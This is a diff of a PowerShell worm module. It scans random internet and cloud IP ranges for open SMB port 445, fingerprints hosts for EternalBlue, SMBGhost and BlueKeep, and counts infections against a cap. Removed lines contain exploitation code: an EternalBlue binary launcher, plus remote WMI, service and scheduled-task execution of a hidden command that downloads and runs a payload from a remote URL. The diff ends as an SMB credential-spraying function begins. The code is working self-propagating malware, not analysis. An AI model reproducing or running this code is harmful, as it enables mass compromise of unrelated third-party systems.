@@ -1305,159 +1305,215 @@ $wormScriptBlock = {
 $wormScriptPath = "$BASE\mf_worm.ps1"
 $wormScriptContent = @"
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-`$ErrorActionPreference = "SilentlyContinue"
-`$ProgressPreference = "SilentlyContinue"
+$ErrorActionPreference = "SilentlyContinue"
+$ProgressPreference = "SilentlyContinue"
 
-`$BASE = "$BASE"
-`$PAYLOAD_URL = "$PAYLOAD_URL"
-`$MAX_TARGETS = $MAX_TARGETS
-`$WORM_EXPIRY = "$WORM_EXPIRY"
-`$ebExe = "$ebExe"
-`$ebReady = $ebReady
-`$STATUS_FILE = "$STATUS_FILE"
-`$WORM_LOG = "`$BASE\worm.log"
+$BASE = "$BASE"
+$PAYLOAD_URL = "$PAYLOAD_URL"
+$MAX_TARGETS = $MAX_TARGETS
+$WORM_EXPIRY = "$WORM_EXPIRY"
+$ebExe = "$ebExe"
+$ebReady = $ebReady
+$STATUS_FILE = "$STATUS_FILE"
+$WORM_LOG = "$BASE\worm.log"
 
-function WLog {
-    param([string]`$msg)
-    try { `$ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"; Add-Content -Path "`$BASE\worm.log" -Value "[`$ts] `$msg" -ErrorAction SilentlyContinue } catch {}
-}
+function WLog { param([string]$msg) try { $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"; Add-Content -Path "$BASE\worm.log" -Value "[$ts] $msg" -ErrorAction SilentlyContinue } catch {} }
 
-function Update-Status {
-    param([string]`$key, `$value)
-    try {
-        `$lock = New-Object System.Threading.Mutex(`$false, "Global\MF_Worm_Status_Lock")
-        `$lock.WaitOne(5000) | Out-Null
-        `$raw = Get-Content `$STATUS_FILE -Raw -ErrorAction SilentlyContinue
-        `$json = `$raw | ConvertFrom-Json -ErrorAction SilentlyContinue
-        if (-not `$json) { `$json = @{} }
-        `$json.`$key = `$value
-        `$json.last_update = (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
-        `$json | ConvertTo-Json -Compress | Set-Content `$STATUS_FILE -Force -ErrorAction SilentlyContinue
-        `$lock.ReleaseMutex()
-    } catch {}
+function Update-Status { param([string]$key, $value) try { $lock = New-Object System.Threading.Mutex($false, "Global\MF_Worm_Status_Lock"); $lock.WaitOne(5000) | Out-Null; $raw = Get-Content $STATUS_FILE -Raw -ErrorAction SilentlyContinue; $json = $raw | ConvertFrom-Json -ErrorAction SilentlyContinue; if (-not $json) { $json = @{} }; $json.$key = $value; $json.last_update = (Get-Date -Format "yyyy-MM-dd HH:mm:ss"); $json | ConvertTo-Json -Compress | Set-Content $STATUS_FILE -Force -ErrorAction SilentlyContinue; $lock.ReleaseMutex() } catch {} }
+
+function Get-TargetedIP {
+    $highValueRanges = @("45.76.0.0/16","45.77.0.0/16","45.79.0.0/16","66.42.0.0/16","108.61.0.0/16","149.28.0.0/16","155.138.0.0/16","173.199.0.0/16","198.13.0.0/16","207.246.0.0/16","13.32.0.0/16","13.35.0.0/16","13.248.0.0/16","15.188.0.0/16","18.130.0.0/16","18.133.0.0/16","18.140.0.0/16","35.153.0.0/16","35.156.0.0/16","35.158.0.0/16","35.160.0.0/16","52.0.0.0/8","54.0.0.0/8","34.64.0.0/16","34.66.0.0/16","34.67.0.0/16","34.68.0.0/16","34.69.0.0/16","34.70.0.0/16","34.71.0.0/16","34.72.0.0/16","34.73.0.0/16","34.74.0.0/16","34.75.0.0/16","34.76.0.0/16","34.77.0.0/16","34.78.0.0/16","34.79.0.0/16","34.80.0.0/16","34.81.0.0/16","34.82.0.0/16","34.83.0.0/16","34.84.0.0/16","34.85.0.0/16","34.86.0.0/16","34.87.0.0/16","34.88.0.0/16","34.89.0.0/16","34.90.0.0/16","34.91.0.0/16","34.92.0.0/16","34.93.0.0/16","34.94.0.0/16","34.95.0.0/16","34.96.0.0/16","34.97.0.0/16","34.98.0.0/16","34.99.0.0/16","34.100.0.0/16","34.101.0.0/16","34.102.0.0/16","34.103.0.0/16","34.104.0.0/16","34.105.0.0/16","34.106.0.0/16","34.107.0.0/16","34.108.0.0/16","34.109.0.0/16","34.110.0.0/16","34.111.0.0/16","34.112.0.0/16","34.113.0.0/16","34.114.0.0/16","34.115.0.0/16","34.116.0.0/16","34.117.0.0/16","34.118.0.0/16","34.119.0.0/16","34.120.0.0/16","34.121.0.0/16","34.122.0.0/16","34.123.0.0/16","34.124.0.0/16","34.125.0.0/16","34.126.0.0/16","34.127.0.0/16","34.128.0.0/16","34.129.0.0/16","34.130.0.0/16","34.131.0.0/16","34.132.0.0/16","34.133.0.0/16","34.134.0.0/16","34.135.0.0/16","34.136.0.0/16","34.137.0.0/16","34.138.0.0/16","34.139.0.0/16","34.140.0.0/16","34.141.0.0/16","34.142.0.0/16","34.143.0.0/16","34.144.0.0/16","34.145.0.0/16","34.146.0.0/16","34.147.0.0/16","34.148.0.0/16","34.149.0.0/16","34.150.0.0/16","34.151.0.0/16","34.152.0.0/16","34.153.0.0/16","34.154.0.0/16","34.155.0.0/16","34.156.0.0/16","34.157.0.0/16","34.158.0.0/16","34.159.0.0/16","34.160.0.0/16","13.64.0.0/16","13.65.0.0/16","13.66.0.0/16","13.67.0.0/16","13.68.0.0/16","13.69.0.0/16","13.70.0.0/16","13.71.0.0/16","13.72.0.0/16","13.73.0.0/16","13.74.0.0/16","13.75.0.0/16","13.76.0.0/16","13.77.0.0/16","13.78.0.0/16","13.79.0.0/16","13.80.0.0/16","13.81.0.0/16","13.82.0.0/16","13.83.0.0/16","13.84.0.0/16","13.85.0.0/16","13.86.0.0/16","13.87.0.0/16","13.88.0.0/16","13.89.0.0/16","13.90.0.0/16","13.91.0.0/16","13.92.0.0/16","13.93.0.0/16","13.94.0.0/16","13.95.0.0/16","13.96.0.0/16","13.97.0.0/16","13.98.0.0/16","13.99.0.0/16","13.100.0.0/16","13.101.0.0/16","13.102.0.0/16","13.103.0.0/16","13.104.0.0/16","13.105.0.0/16","13.106.0.0/16","13.107.0.0/16","13.108.0.0/16","13.109.0.0/16","13.110.0.0/16","13.111.0.0/16","13.112.0.0/16","13.113.0.0/16","13.114.0.0/16","13.115.0.0/16","13.116.0.0/16","13.117.0.0/16","13.118.0.0/16","13.119.0.0/16","13.120.0.0/16","13.121.0.0/16","13.122.0.0/16","13.123.0.0/16","13.124.0.0/16","34.125.0.0/16","34.126.0.0/16","34.127.0.0/16","34.128.0.0/16","34.129.0.0/16","34.130.0.0/16","34.131.0.0/16","34.132.0.0/16","34.133.0.0/16","34.134.0.0/16","34.135.0.0/16","34.136.0.0/16","34.137.0.0/16","34.138.0.0/16","34.139.0.0/16","34.140.0.0/16","34.141.0.0/16","34.142.0.0/16","34.143.0.0/16","34.144.0.0/16","34.145.0.0/16","34.146.0.0/16","34.147.0.0/16","34.148.0.0/16","34.149.0.0/16","34.150.0.0/16","34.151.0.0/16","34.152.0.0/16","34.153.0.0/16","34.154.0.0/16","34.155.0.0/16","34.156.0.0/16","34.157.0.0/16","34.158.0.0/16","34.159.0.0/16","34.160.0.0/16","20.0.0.0/8","23.0.0.0/8","40.0.0.0/8","51.0.0.0/8","52.0.0.0/8","104.0.0.0/8","137.0.0.0/8","138.0.0.0/8","191.0.0.0/8","104.16.0.0/16","104.17.0.0/16","104.18.0.0/16","104.19.0.0/16","104.20.0.0/16","104.21.0.0/16","104.22.0.0/16","104.23.0.0/16","104.24.0.0/16","104.25.0.0/16","104.26.0.0/16","104.27.0.0/16","104.28.0.0/16","104.29.0.0/16","104.30.0.0/16","104.31.0.0/16","172.64.0.0/16","172.65.0.0/16","172.66.0.0/16","172.67.0.0/16","172.68.0.0/16","172.69.0.0/16","172.70.0.0/16","172.71.0.0/16","162.158.0.0/16","162.159.0.0/16","172.64.0.0/16","172.65.0.0/16","172.66.0.0/16","172.67.0.0/16","172.68.0.0/16","172.69.0.0/16","172.70.0.0/16","172.71.0.0/16","104.131.0.0/16","104.236.0.0/16","107.170.0.0/16","128.199.0.0/16","138.197.0.0/16","139.59.0.0/16","142.93.0.0/16","146.185.0.0/16","157.230.0.0/16","159.65.0.0/16","159.89.0.0/16","161.35.0.0/16","165.22.0.0/16","165.227.0.0/16","167.172.0.0/16","167.99.0.0/16","173.255.0.0/16","176.58.0.0/16","192.168.0.0/16","198.58.0.0/16","207.246.0.0/16","216.128.0.0/16","51.38.0.0/16","51.68.0.0/16","51.75.0.0/16","51.77.0.0/16","51.79.0.0/16","51.81.0.0/16","51.83.0.0/16","51.89.0.0/16","51.91.0.0/16","51.195.0.0/16","54.38.0.0/16","91.121.0.0/16","92.222.0.0/16","94.23.0.0/16","137.74.0.0/16","139.99.0.0/16","141.94.0.0/16","144.217.0.0/16","145.239.0.0/16","147.135.0.0/16","149.56.0.0/16","151.80.0.0/16","155.133.0.0/16","158.69.0.0/16","164.132.0.0/16","167.114.0.0/16","178.32.0.0/16","178.33.0.0/16","185.23.0.0/16","188.165.0.0/16","192.99.0.0/16","192.95.0.0/16","192.96.0.0/16","192.97.0.0/16","192.98.0.0/16","192.99.0.0/16","198.27.0.0/16","198.50.0.0/16","213.186.0.0/16","213.251.0.0/16","5.9.0.0/16","5.189.0.0/16","46.4.0.0/16","78.46.0.0/16","78.47.0.0/16","88.99.0.0/16","94.130.0.0/16","95.216.0.0/16","95.217.0.0/16","116.202.0.0/16","116.203.0.0/16","136.243.0.0/16","136.244.0.0/16","138.201.0.0/16","138.201.0.0/16","144.76.0.0/16","148.251.0.0/16","159.69.0.0/16","161.148.0.0/16","162.55.0.0/16","167.86.0.0/16","168.119.0.0/16","176.9.0.0/16","178.63.0.0/16","185.221.0.0/16","185.222.0.0/16","185.223.0.0/16","185.224.0.0/16","188.40.0.0/16","188.40.0.0/16","193.169.0.0/16","195.201.0.0/16","213.133.0.0/16","213.136.0.0/16","213.136.0.0/16","213.239.0.0/16","1.0.0.0/8","27.0.0.0/8","36.0.0.0/8","39.0.0.0/8","42.0.0.0/8","49.0.0.0/8","58.0.0.0/8","59.0.0.0/8","60.0.0.0/8","61.0.0.0/8","101.0.0.0/8","103.0.0.0/8","106.0.0.0/8","110.0.0.0/8","111.0.0.0/8","112.0.0.0/8","113.0.0.0/8","114.0.0.0/8","115.0.0.0/8","116.0.0.0/8","117.0.0.0/8","118.0.0.0/8","119.0.0.0/8","120.0.0.0/8","121.0.0.0/8","122.0.0.0/8","123.0.0.0/8","124.0.0.0/8","125.0.0.0/8","126.0.0.0/8","175.0.0.0/8","180.0.0.0/8","182.0.0.0/8","183.0.0.0/8","202.0.0.0/8","203.0.0.0/8","210.0.0.0/8","211.0.0.0/8","218.0.0.0/8","219.0.0.0/8","220.0.0.0/8","221.0.0.0/8","222.0.0.0/8","223.0.0.0/8","41.0.0.0/8","42.0.0.0/8","102.0.0.0/8","105.0.0.0/8","154.0.0.0/8","156.0.0.0/8","160.0.0.0/8","163.0.0.0/8","164.0.0.0/8","165.0.0.0/8","166.0.0.0/8","167.0.0.0/8","168.0.0.0/8","169.0.0.0/8","170.0.0.0/8","171.0.0.0/8","172.0.0.0/8","173.0.0.0/8","174.0.0.0/8","175.0.0.0/8","176.0.0.0/8","177.0.0.0/8","178.0.0.0/8","179.0.0.0/8","180.0.0.0/8","181.0.0.0/8","182.0.0.0/8","185.0.0.0/8","186.0.0.0/8","187.0.0.0/8","189.0.0.0/8","190.0.0.0/8","191.0.0.0/8","192.0.0.0/8","193.0.0.0/8","194.0.0.0/8","195.0.0.0/8","196.0.0.0/8","197.0.0.0/8","198.0.0.0/8","199.0.0.0/8","200.0.0.0/8","201.0.0.0/8")
+
+    $range = $highValueRanges | Get-Random
+    $parts = $range.Split("/")
+    $baseIp = $parts[0].Split(".")
+    $cidr = [int]$parts[1]
+    $hostBits = 32 - $cidr
+    $hostMax = [math]::Pow(2, $hostBits) - 1
+    $randHost = Get-Random -Minimum 1 -Maximum ($hostMax + 1)
+    $ipInt = ([int]$baseIp[0] * 16777216) + ([int]$baseIp[1] * 65536) + ([int]$baseIp[2] * 256) + [int]$baseIp[3]
+    $ipInt += $randHost
+    $a = [math]::Floor($ipInt / 16777216)
+    $b = [math]::Floor(($ipInt % 16777216) / 65536)
+    $c = [math]::Floor(($ipInt % 65536) / 256)
+    $d = $ipInt % 256
+    if ($a -eq 10 -or $a -eq 127 -or ($a -eq 169 -and $b -eq 254) -or $a -eq 0 -or $a -ge 224) { return Get-TargetedIP }
+    if ($a -eq 172 -and $b -ge 16 -and $b -le 31) { return Get-TargetedIP }
+    if ($a -eq 192 -and $b -eq 168) { return Get-TargetedIP }
+    if ($a -eq 100 -and $b -ge 64 -and $b -le 127) { return Get-TargetedIP }
+    return "$a.$b.$c.$d"
 }
 
 function Get-RandomPublicIP {
-    `$ranges = @(
-        @(30, 1, 223), @(10, 45, 45), @(10, 52, 52), @(10, 13, 13), @(8, 104, 104), @(8, 18, 18),
-        @(5, 199, 199), @(5, 207, 207), @(5, 208, 208), @(5, 209, 209), @(5, 64, 64), @(5, 67, 67),
-        @(5, 68, 68), @(5, 69, 69), @(5, 70, 70), @(5, 71, 71), @(5, 72, 72), @(5, 73, 73), @(5, 74, 74),
-        @(5, 75, 75), @(5, 76, 76), @(5, 77, 77), @(5, 78, 78), @(5, 79, 79), @(5, 80, 80), @(5, 81, 81),
-        @(5, 82, 82), @(5, 83, 83), @(5, 84, 84), @(5, 85, 85), @(5, 86, 86), @(5, 87, 87), @(5, 88, 88),
-        @(5, 89, 89), @(5, 90, 90), @(5, 91, 91), @(5, 92, 92), @(5, 93, 93), @(5, 94, 94), @(5, 95, 95),
-        @(5, 96, 96), @(5, 97, 97), @(5, 98, 98), @(5, 99, 99), @(5, 100, 100), @(5, 101, 101), @(5, 102, 102),
-        @(5, 103, 103), @(5, 107, 107), @(5, 108, 108), @(5, 110, 110), @(5, 111, 111), @(5, 112, 112),
-        @(5, 113, 113), @(5, 114, 114), @(5, 115, 115), @(5, 116, 116), @(5, 117, 117), @(5, 118, 118),
-        @(5, 119, 119), @(5, 120, 120), @(5, 121, 121), @(5, 122, 122), @(5, 123, 123), @(5, 124, 124),
-        @(5, 125, 125), @(5, 126, 126), @(5, 128, 128), @(5, 129, 129), @(5, 130, 130), @(5, 131, 131),
-        @(5, 132, 132), @(5, 134, 134), @(5, 136, 136), @(5, 137, 137), @(5, 138, 138), @(5, 139, 139),
-        @(5, 140, 140), @(5, 141, 141), @(5, 142, 142), @(5, 143, 143), @(5, 144, 144), @(5, 146, 146),
-        @(5, 147, 147), @(5, 148, 148), @(5, 149, 149), @(5, 150, 150), @(5, 151, 151), @(5, 152, 152),
-        @(5, 153, 153), @(5, 154, 154), @(5, 155, 155), @(5, 156, 156), @(5, 157, 157), @(5, 158, 158),
-        @(5, 159, 159), @(5, 160, 160), @(5, 161, 161), @(5, 162, 162), @(5, 163, 163), @(5, 164, 164),
-        @(5, 165, 165), @(5, 166, 166), @(5, 167, 167), @(5, 168, 168), @(5, 169, 169), @(5, 170, 170),
-        @(5, 171, 171), @(5, 172, 172), @(5, 173, 173), @(5, 174, 174), @(5, 175, 175), @(5, 176, 176),
-        @(5, 177, 177), @(5, 178, 178), @(5, 179, 179), @(5, 180, 180), @(5, 181, 181), @(5, 182, 182),
-        @(5, 183, 183), @(5, 184, 184), @(5, 185, 185), @(5, 186, 186), @(5, 187, 187), @(5, 188, 188),
-        @(5, 189, 189), @(5, 190, 190), @(5, 191, 191), @(5, 192, 192), @(5, 193, 193), @(5, 194, 194),
-        @(5, 195, 195), @(5, 196, 196), @(5, 197, 197), @(5, 198, 198), @(5, 200, 200), @(5, 201, 201),
-        @(5, 202, 202), @(5, 203, 203), @(5, 204, 204), @(5, 205, 205), @(5, 206, 206), @(5, 210, 210),
-        @(5, 211, 211), @(5, 212, 212), @(5, 213, 213), @(5, 214, 214), @(5, 215, 215), @(5, 216, 216),
-        @(5, 217, 217), @(5, 218, 218), @(5, 219, 219), @(5, 220, 220), @(5, 221, 221), @(5, 222, 222),
-        @(5, 223, 223)
-    )
-    `$totalWeight = (`$ranges | Measure-Object -Property 0 -Sum).Sum
-    `$pick = Get-Random -Maximum `$totalWeight
-    `$accum = 0
-    `$selectedRange = `$ranges[0]
-    foreach (`$r in `$ranges) { `$accum += `$r[0]; if (`$pick -lt `$accum) { `$selectedRange = `$r; break } }
-    while (`$true) {
-        `$a = Get-Random -Minimum `$selectedRange[1] -Maximum (`$selectedRange[2] + 1)
-        `$b = Get-Random -Minimum 0 -Maximum 256; `$c = Get-Random -Minimum 0 -Maximum 256; `$d = Get-Random -Minimum 1 -Maximum 255
-        if (`$a -eq 10 -or `$a -eq 127 -or (`$a -eq 169 -and `$b -eq 254) -or `$a -eq 0 -or `$a -ge 224) { continue }
-        if (`$a -eq 172 -and `$b -ge 16 -and `$b -le 31) { continue }
-        if (`$a -eq 192 -and `$b -eq 168) { continue }
-        if (`$a -eq 100 -and `$b -ge 64 -and `$b -le 127) { continue }
-        if (`$a -eq 192 -and `$b -eq 0 -and `$c -eq 2) { continue }
-        if (`$a -eq 198 -and (`$b -eq 18 -or `$b -eq 19)) { continue }
-        if (`$a -eq 198 -and `$b -eq 51 -and `$c -eq 100) { continue }
-        if (`$a -eq 203 -and `$b -eq 0 -and `$c -eq 113) { continue }
-        if (`$a -eq 192 -and `$b -eq 88 -and `$c -eq 99) { continue }
-        return "`$a.`$b.`$c.`$d"
+    while ($true) {
+        $a = Get-Random -Minimum 1 -Maximum 224
+        $b = Get-Random -Minimum 0 -Maximum 256
+        $c = Get-Random -Minimum 0 -Maximum 256
+        $d = Get-Random -Minimum 1 -Maximum 255
+        if ($a -eq 10 -or $a -eq 127 -or ($a -eq 169 -and $b -eq 254) -or $a -eq 0 -or $a -ge 224) { continue }
+        if ($a -eq 172 -and $b -ge 16 -and $b -le 31) { continue }
+        if ($a -eq 192 -and $b -eq 168) { continue }
+        if ($a -eq 100 -and $b -ge 64 -and $b -le 127) { continue }
+        if ($a -eq 192 -and $b -eq 0 -and $c -eq 2) { continue }
+        if ($a -eq 198 -and ($b -eq 18 -or $b -eq 19)) { continue }
+        if ($a -eq 198 -and $b -eq 51 -and $c -eq 100) { continue }
+        if ($a -eq 203 -and $b -eq 0 -and $c -eq 113) { continue }
+        if ($a -eq 192 -and $b -eq 88 -and $c -eq 99) { continue }
+        return "$a.$b.$c.$d"
     }
 }
 
-function Scan-SMBHosts { param([int]`$Count = 1000)
-    `$openHosts = [System.Collections.Concurrent.ConcurrentBag[string]]::new()
-    `$runspacePool = [runspacefactory]::CreateRunspacePool(1, 200); `$runspacePool.Open()
-    `$jobs = [System.Collections.ArrayList]::new()
-    `$ipBatch = @(); for (`$i = 0; `$i -lt `$Count; `$i++) { `$ipBatch += Get-RandomPublicIP }
-    WLog "Scanning `$Count random internet IPs for port 445 (200 parallel)..."
-    foreach (`$ip in `$ipBatch) {
-        `$ps = [PowerShell]::Create(); `$ps.RunspacePool = `$runspacePool
-        [void]`$ps.AddScript({ param(`$t) `$tcp = New-Object System.Net.Sockets.TcpClient; `$iar = `$tcp.BeginConnect(`$t, 445, `$null, `$null); `$success = `$iar.AsyncWaitHandle.WaitOne(800, `$false); if (`$success -and `$tcp.Connected) { `$tcp.Close(); return `$t } try { `$tcp.Close() } catch {}; return `$null })
-        [void]`$ps.AddArgument(`$ip); `$job = `$ps.BeginInvoke(); `$jobs.Add(@{ PS = `$ps; Job = `$job; Target = `$ip })
+function Scan-Port445Fast {
+    param([string[]]$IPs, [int]$TimeoutMs = 500)
+    $openHosts = [System.Collections.Concurrent.ConcurrentBag[string]]::new()
+    $runspacePool = [runspacefactory]::CreateRunspacePool(1, 500); $runspacePool.Open()
+    $jobs = [System.Collections.ArrayList]::new()
+    foreach ($ip in $IPs) {
+        $ps = [PowerShell]::Create(); $ps.RunspacePool = $runspacePool
+        [void]$ps.AddScript({ param($t, $to) try { $tcp = New-Object System.Net.Sockets.TcpClient; $tcp.NoDelay = $true; $iar = $tcp.BeginConnect($t, 445, $null, $null); $success = $iar.AsyncWaitHandle.WaitOne($to, $false); if ($success -and $tcp.Connected) { $tcp.Close(); return $t } $tcp.Close() } catch {}; return $null })
+        [void]$ps.AddArgument($ip); [void]$ps.AddArgument($TimeoutMs); $job = $ps.BeginInvoke(); $jobs.Add(@{ PS = $ps; Job = $job; Target = $ip })
     }
-    `$completed = 0; foreach (`$j in `$jobs) { `$result = `$j.PS.EndInvoke(`$j.Job); if (`$result -and `$result[0]) { `$openHosts.Add(`$result[0]) }; `$j.PS.Dispose(); `$completed++; if (`$completed % 200 -eq 0) { Update-Status "last_action" "Scanned `$completed/`$Count IPs..." } }
-    `$runspacePool.Close(); `$runspacePool.Dispose()
-    WLog "Scan complete. `$(`$openHosts.Count) hosts with port 445 open."; return `$openHosts.ToArray()
+    $completed = 0; foreach ($j in $jobs) { $result = $j.PS.EndInvoke($j.Job); if ($result -and $result[0]) { $openHosts.Add($result[0]) }; $j.PS.Dispose(); $completed++; if ($completed % 500 -eq 0) { Update-Status "last_action" "Fast scan: $completed/$($IPs.Count) completed..." } }
+    $runspacePool.Close(); $runspacePool.Dispose()
+    return $openHosts.ToArray()
 }
 
-function Test-EBVuln { param([string]`$ip)
-    try { `$tcp = New-Object System.Net.Sockets.TcpClient; `$iar = `$tcp.BeginConnect(`$ip, 445, `$null, `$null); `$success = `$iar.AsyncWaitHandle.WaitOne(2000, `$false); if (-not `$success -or -not `$tcp.Connected) { `$tcp.Close(); return `$false }
-    `$stream = `$tcp.GetStream(); `$stream.WriteTimeout = 3000; `$stream.ReadTimeout = 3000
-    `$negotiate = [byte[]]@(0x00,0x00,0x00,0x72,0xFF,0x53,0x4D,0x42,0x72,0x00,0x00,0x00,0x00,0x18,0x53,0xC8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xFE,0xFF,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00)
-    `$stream.Write(`$negotiate, 0, `$negotiate.Length); Start-Sleep -Milliseconds 300
-    `$buffer = New-Object byte[] 4096; `$read = `$stream.Read(`$buffer, 0, `$buffer.Length); `$tcp.Close()
-    if (`$read -gt 34 -and `$buffer[4] -eq 0xFF -and `$buffer[5] -eq 0x53 -and `$buffer[6] -eq 0x4D -and `$buffer[7] -eq 0x42 -and `$buffer[34] -le 0x05) { return `$true }
-    return `$false } catch { return `$false }
+function Get-SMBInfo {
+    param([string]$ip, [int]$Port = 445)
+    try {
+        $tcp = New-Object System.Net.Sockets.TcpClient
+        $iar = $tcp.BeginConnect($ip, $Port, $null, $null)
+        $success = $iar.AsyncWaitHandle.WaitOne(3000, $false)
+        if (-not $success -or -not $tcp.Connected) { $tcp.Close(); return $null }
+        $stream = $tcp.GetStream(); $stream.WriteTimeout = 5000; $stream.ReadTimeout = 5000
+        $negotiate = [byte[]]@(0x00,0x00,0x00,0x72,0xFF,0x53,0x4D,0x42,0x72,0x00,0x00,0x00,0x00,0x18,0x53,0xC8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xFE,0xFF,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00)
+        $stream.Write($negotiate, 0, $negotiate.Length); Start-Sleep -Milliseconds 500
+        $buffer = New-Object byte[] 8192; $read = $stream.Read($buffer, 0, $buffer.Length); $tcp.Close()
+        if ($read -lt 35) { return $null }
+        $dialect = 0; if ($read -ge 36) { $dialect = $buffer[34] + ($buffer[35] * 256) }
+        $signingRequired = $false; if ($read -ge 70) { $signingRequired = ($buffer[68] -band 0x08) -ne 0 }
+        return @{ IP = $ip; Dialect = $dialect; SigningRequired = $signingRequired; RawResponse = $buffer[0..($read-1)]; VulnEB = $false; VulnSMBGhost = $false; VulnBlueKeep = $false }
+    } catch { return $null }
 }
 
-function Invoke-EBExploit { param([string]`$ip)
-    `$randChar = [char](Get-Random -Minimum 97 -Maximum 122)
-    `$cmd = "powershell.exe -W Hidden -EP Bypass -Command \`"[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; iwr '\$PAYLOAD_URL\$randChar' -OutFile '\$env:TEMP\s.ps1' -UseBasicParsing; Start-Process powershell -ArgumentList '-W Hidden -EP Bypass -F \`"\$env:TEMP\s.ps1\`"' -WindowStyle Hidden; exit\`""
-    if (`$ebReady -and (Test-Path `$ebExe)) { WLog "Firing compiled EB exploit at `$ip"; try { `$p = Start-Process -FilePath `$ebExe -ArgumentList "\`"`$ip\`" \`"`$cmd\`"" -WindowStyle Hidden -PassThru -Wait; if (`$p.ExitCode -eq 0) { WLog "EB exploit executed on `$ip"; return `$true } } catch { WLog "EB exploit binary failed: `$(`$_.Exception.Message)" } }
-    WLog "Trying PS-based exploitation on `$ip"; `$result = `$false
-    foreach (`$m in @(
-        { try { `$r = Invoke-WmiMethod -ComputerName `$ip -Class Win32_Process -Name Create -ArgumentList `$cmd -ErrorAction SilentlyContinue; if (`$r -and `$r.ReturnValue -eq 0) { return `$true } } catch {}; return `$false },
-        { try { `$sn = "sys"+(Get-Random -Max 9999); cmd /c "sc.exe \\\$ip create \$sn binPath= \`"cmd /c \$cmd\`" 2>nul" 2>`$null; cmd /c "sc.exe \\\$ip start \$sn 2>nul" 2>`$null; Start-Sleep 1; cmd /c "sc.exe \\\$ip delete \$sn 2>nul" 2>`$null; return `$true } catch {}; return `$false },
-        { try { `$tn = "SystemUpdate"+(Get-Random -Max 9999); cmd /c "schtasks /create /s \$ip /tn \$tn /tr \`"\$cmd\`" /sc once /st 00:00 /ru System /f 2>nul" 2>`$null; cmd /c "schtasks /run /s \$ip /tn \$tn 2>nul" 2>`$null; Start-Sleep 1; cmd /c "schtasks /delete /s \$ip /tn \$tn /f 2>nul" 2>`$null; return `$true } catch {}; return `$false }
-    )) { if (& `$m) { `$result = `$true; break } }
-    if (`$result) { WLog "Exploitation succeeded on `$ip" }; return `$result
+function Test-Vulnerabilities {
+    param([hashtable]$smbInfo)
+    if (-not $smbInfo) { return $smbInfo }
+    $dialect = $smbInfo.Dialect
+    if ($dialect -eq 0x0202 -or $dialect -eq 0x0210 -or $dialect -eq 0x02FF) { $smbInfo.VulnEB = $true }
+    if ($dialect -eq 0x0300 -or $dialect -eq 0x0302 -or $dialect -eq 0x0311) { $smbInfo.VulnSMBGhost = $true }
+    return $smbInfo
 }
 
-function Test-Gov { try { `$exp = [datetime]::Parse(`$WORM_EXPIRY); if ((Get-Date) -gt `$exp) { WLog "Worm expired"; return `$false } } catch {}; `$cnt = 0; try { if (Test-Path "`$BASE\infection_count.txt") { `$cnt = [int](Get-Content "`$BASE\infection_count.txt" -First 1 -ErrorAction SilentlyContinue) } } catch {}; if (`$cnt -ge `$MAX_TARGETS) { WLog "Cap reached: `$cnt/`$MAX_TARGETS"; return `$false }; return `$true }
-function Update-Count { try { `$cnt = 0; if (Test-Path "`$BASE\infection_count.txt") { `$cnt = [int](Get-Content "`$BASE\infection_count.txt" -First 1 -ErrorAction SilentlyContinue) }; `$cnt++; Set-Content -Path "`$BASE\infection_count.txt" -Value `$cnt -Force -ErrorAction SilentlyContinue; WLog "Infection count: `$cnt/`$MAX_TARGETS"; Update-Status "infected" `$cnt } catch {} }
+function Test-BlueKeep {
+    param([string]$ip)
+    try {
+        $tcp = New-Object System.Net.Sockets.TcpClient
+        $iar = $tcp.BeginConnect($ip, 3389, $null, $null)
+        $success = $iar.AsyncWaitHandle.WaitOne(2000, $false)
+        if (-not $success -or -not $tcp.Connected) { $tcp.Close(); return $false }
+        $stream = $tcp.GetStream(); $stream.WriteTimeout = 3000; $stream.ReadTimeout = 3000
+        $x224 = [byte[]]@(0x03,0x00,0x00,0x13,0x0E,0xE0,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x08,0x00,0x03,0x00,0x00,0x00)
+        $stream.Write($x224, 0, $x224.Length); Start-Sleep -Milliseconds 500
+        $buffer = New-Object byte[] 4096; $read = $stream.Read($buffer, 0, $buffer.Length); $tcp.Close()
+        if ($read -ge 19 -and $buffer[15] -eq 0x01) { return $true }
+        return $false
+    } catch { return $false }
+}
 
-WLog "============================================"; WLog "WORM MODULE STARTING - INTERNET WIDE ONLY"; WLog "Max targets: `$MAX_TARGETS"; WLog "Expiry: `$WORM_EXPIRY"; WLog "EB Exploit: `$ebReady"; WLog "============================================"
+function Spray-SMBCreds {
+    param([string]$ip)
